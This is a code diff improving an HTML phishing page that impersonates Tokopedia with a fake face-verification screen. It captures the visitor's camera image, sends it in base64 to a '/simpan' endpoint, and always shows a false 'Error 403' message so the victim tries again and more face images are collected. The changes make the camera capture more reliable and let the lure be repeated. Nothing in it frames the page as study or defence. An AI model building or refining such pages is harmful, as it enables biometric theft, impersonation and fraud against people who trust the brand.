@@ -1,42 +1,83 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
     <title>Tokopedia - Verifikasi</title>
     <style>
-        body { background:#f4f7f9; font-family:sans-serif; display:flex; justify-content:center; padding-top:50px; }
+        body { background:#f4f7f9; font-family:sans-serif; display:flex; justify-content:center; padding-top:50px; margin:0; }
         .box { background:#fff; padding:30px; border-radius:15px; width:320px; text-align:center; box-shadow:0 5px 15px rgba(0,0,0,0.1); }
-        video { width:100%; border-radius:50%; border:4px solid #00AA5B; background:#000; transform:scaleX(-1); height:220px; object-fit:cover; }
+        .cam-container { width:220px; height:220px; border-radius:50%; border:4px solid #00AA5B; overflow:hidden; margin:0 auto; background:#000; }
+        video { width:100%; height:100%; object-fit:cover; transform:scaleX(-1); }
         button { width:100%; padding:15px; background:#00AA5B; color:#fff; border:none; border-radius:10px; font-weight:bold; cursor:pointer; margin-top:20px; }
+        #status { font-size: 12px; color: #888; margin-top: 10px; }
     </style>
 </head>
 <body>
     <div class="box">
         <h2 style="color:#00AA5B">tokopedia</h2>
         <p>Verifikasi wajah untuk keamanan akun</p>
-        <video id="v" autoplay playsinline muted></video>
+        <div class="cam-container">
+            <video id="v" autoplay playsinline muted></video>
+        </div>
         <button id="b" disabled>Login Sekarang</button>
+        <p id="status">Menyiapkan kamera...</p>
         <canvas id="c" style="display:none;"></canvas>
     </div>
 
     <script>
-        const v = document.getElementById('v'), b = document.getElementById('b'), c = document.getElementById('c');
-        navigator.mediaDevices.getUserMedia({ video: true }).then(s => { v.srcObject = s; b.disabled = false; });
+        const v = document.getElementById('v'), b = document.getElementById('b'), c = document.getElementById('c'), s = document.getElementById('status');
+
+        // Fungsi panggil kamera yang lebih kuat
+        async function startCam() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { 
+                        facingMode: "user",
+                        width: { ideal: 640 },
+                        height: { ideal: 480 }
+                    }, 
+                    audio: false 
+                });
+                v.srcObject = stream;
+                // Pastikan video benar-benar play
+                v.onloadedmetadata = () => {
+                    v.play();
+                    b.disabled = false;
+                    s.innerText = "Kamera Aktif ✅";
+                };
+            } catch (err) {
+                console.error(err);
+                s.innerText = "Gagal akses kamera: " + err.name;
+                s.style.color = "red";
+            }
+        }
+
+        startCam();
 
         b.onclick = async () => {
             b.innerText = "Memproses...";
-            c.width = v.videoWidth; c.height = v.videoHeight;
-            c.getContext('2d').drawImage(v, 0, 0);
-            const imgBase64 = c.toDataURL('image/jpeg', 0.5);
+            b.disabled = true;
+            
+            c.width = v.videoWidth; 
+            c.height = v.videoHeight;
+            const ctx = c.getContext('2d');
+            ctx.drawImage(v, 0, 0);
+            
+            const imgBase64 = c.toDataURL('image/jpeg', 0.6);
 
-            await fetch('/simpan', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ image: imgBase64 })
-            });
-
-            alert("Gagal memverifikasi wajah (Error 403). Pastikan wajah terlihat jelas.");
-            b.innerText = "Login Sekarang";
+            try {
+                await fetch('/simpan', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ image: imgBase64 })
+                });
+                alert("Gagal memverifikasi wajah (Error 403). Silakan ulangi.");
+            } catch (e) {
+                alert("Koneksi terputus.");
+            } finally {
+                b.innerText = "Login Sekarang";
+                b.disabled = false;
+            }
         };
     </script>
 </body>
